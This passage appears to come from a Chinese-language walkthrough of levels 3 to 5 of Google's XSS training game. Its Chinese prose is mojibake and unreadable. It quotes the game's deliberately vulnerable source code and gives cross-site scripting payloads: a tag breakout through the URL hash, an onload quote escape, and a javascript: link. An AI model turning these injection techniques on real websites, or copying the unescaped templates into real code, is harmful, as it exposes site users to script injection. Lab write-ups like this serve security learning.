</p><pre class="language-js" data-language="js"><code class="language-js">html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span></code></pre><p><code>num</code>æ˜¯#åé¢çš„è¾“å…¥ï¼Œæ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥è®©å®ƒçš„imgæ ‡ç­¾é—­åˆï¼Œå†åŠ ä¸Šæˆ‘ä»¬çš„ä»£ç å³å¯</p><p><code>&lt;img src=&#39;/static/level3/cloud + num + .jpg&#39; /&gt;</code></p><p>å³å˜ä¸º<code>&lt;img src=&#39;/static/level3/cloud&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;.jpg&#39; /&gt;</code></p><p>Payloadï¼š</p><pre class="language-js" data-language="js"><code class="language-js">'<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><img src="/article/xss/image-20210424150902973.png" class="" title="level3-1" loading="lazy"><img src="/article/xss/image-20210424150928175.png" class="" title="level3-2" loading="lazy"><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a href="https://xss-game.appspot.com/level4/frame#">https://xss-game.appspot.com/level4/frame#</a></p><p>æºç Â·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Create timer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main timer page</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token comment"># Show the results page</span>      timer<span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'timer.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token string">'timer'</span> <span class="token punctuation">:</span> timer <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Timer.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        seconds <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"Time is up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>é»˜è®¤3ç§’<code>seconds = parseInt(seconds) || 3;</code></p><p>è¾“å…¥100ï¼Œçœ‹åˆ°åŠ è½½å¦‚ä¸‹</p><p><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;100&#39;);&quot;&gt;</code></p><p>äºæ˜¯æƒ³åŠæ³•é—­åˆï¼Œç”¨å•å¼•å·é—­åˆ<code>startTimer</code>ï¼Œç„¶åå†™å¼¹çª—å†å’Œåé¢çš„<code>&#39;)</code>é—­åˆ</p><blockquote><p>onload äº‹ä»¶ä¼šåœ¨é¡µé¢æˆ–å›¾åƒåŠ è½½å®Œæˆåç«‹å³å‘ç”Ÿ</p></blockquote><p>Payload:</p><pre class="language-none"><code class="language-none">&#39;);alert(&#39;1</code></pre><p>å³å˜ä¸º<code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#39;);alert(&#39;1&#39;);&quot;&gt;</code></p><img src="/article/xss/image-20210424152557697.png" class="" title="level4-1" loading="lazy"><img src="/article/xss/image-20210424152620652.png" class="" title="level4-2" loading="lazy"><hr><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="https://xss-game.appspot.com/level5/frame#">https://xss-game.appspot.com/level5/frame#</a></p><p>æºç Â·confirm.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Thanks for signing up, you will be redirected soon...    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'&#123;&#123; next &#125;&#125;'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token comment"># Route the request to the appropriate template</span>    <span class="token keyword">if</span> <span class="token string">"signup"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'signup.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"confirm"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'confirm.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'welcome'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'welcome.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Signup.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- We're ignoring the email, but the poor user will never know! --></span>    Enter email: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reader-email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Welcome.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Welcome! Today we are announcing the much anticipated<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/level5/frame/signup?next=confirm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Sign up<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>     for an exclusive Beta.  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>ç›´æ¥è®²nextå‚æ•°å¡«å…¥htmlï¼Œhrefä¹Ÿæ˜¯å¯ä»¥æ‰§è¡ŒJavaScriptä»£ç çš„</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">next&#x3D;javascript:alert(1);</code></pre><p>ç„¶åç‚¹<code>Next&gt;&gt;</code>å°±è¡Œ</p><img src="/article/xss/image-20210424163533941.png" class="" title="level5-1" loading="lazy"><img src="/article/xss/85F04A35-370A-4FD5-9526-C80E89A2546A.png" class="" title="level5-2" loading="lazy"><blockquote><p>è¶…é“¾æ¥æ ‡ç­¾<code>&lt;a&gt;</code>,ç”¨æˆ·ç‚¹å‡»ç›¸åº”æŒ‰é’®æ—¶å¯ä»¥è·³è½¬åˆ°æ–°çš„é¡µé¢ï¼ˆæ‰§è¡ŒæŸä¸ªJavaScriptï¼‰ï¼Œç”¨åˆ°äº†è¿™æ ·çš„ä»£ç ç»“æ„ï¼š</p><p><code>&lt;a 